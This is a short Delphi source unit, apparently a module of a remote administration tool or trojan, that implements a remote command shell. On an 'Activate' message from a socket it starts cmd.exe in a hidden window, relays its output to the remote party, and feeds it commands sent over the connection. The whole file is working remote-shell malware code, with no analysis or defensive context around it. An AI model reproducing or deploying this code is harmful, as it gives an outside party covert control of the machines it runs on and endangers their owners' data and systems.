unit UnitRemoteShell;

interface

uses
  applicationunit,windows,socketunit, unitshareddata, CompressionStreamUnit,ShlObj,ShFolder,
    ShellAPi, ImageHlp;

var
  NewSocket: TClientSocket;
  Buffer: string;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  hiRead, hoRead, hiWrite, hoWrite: THandle;
  StartupInfo: TSTARTUPINFO;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: dword;

procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'RemoteShell|' + Data);
end;

procedure ShellThread;
begin
  setlength(Buffer,4096);
  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);
  GetStartupInfo(StartupInfo);
  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;
  CreateProcess(nil, 'cmd', nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartupInfo, ProcessInfo);
  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);

  while True do begin
    if NewSocket = nil then break;
    if not NewSocket.Connected then break;
    Sleep(10);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;
    ReadFile(hoRead, pointer(Buffer)^, 4096, BytesRead, nil);
    if BytesRead > 0 then SendData(NewSocket,'Command|' + copy(Buffer,1,BytesRead));
  end;

  TerminateProcess(ProcessInfo.hProcess, 0);
  CloseHandle(hoRead);
  CloseHandle(hiWrite);
  ExitThread(0);
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
  Thr: dword;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Activate' then begin
    NewSocket := Socket;
    CreateThread(nil,0,@ShellThread,nil,0,Thr);
  end;

  if Command = 'Command' then begin
    WriteFile(hiWrite,pointer(Data)^, length(Data), BytesWritten, nil);
  end;

end;

end.
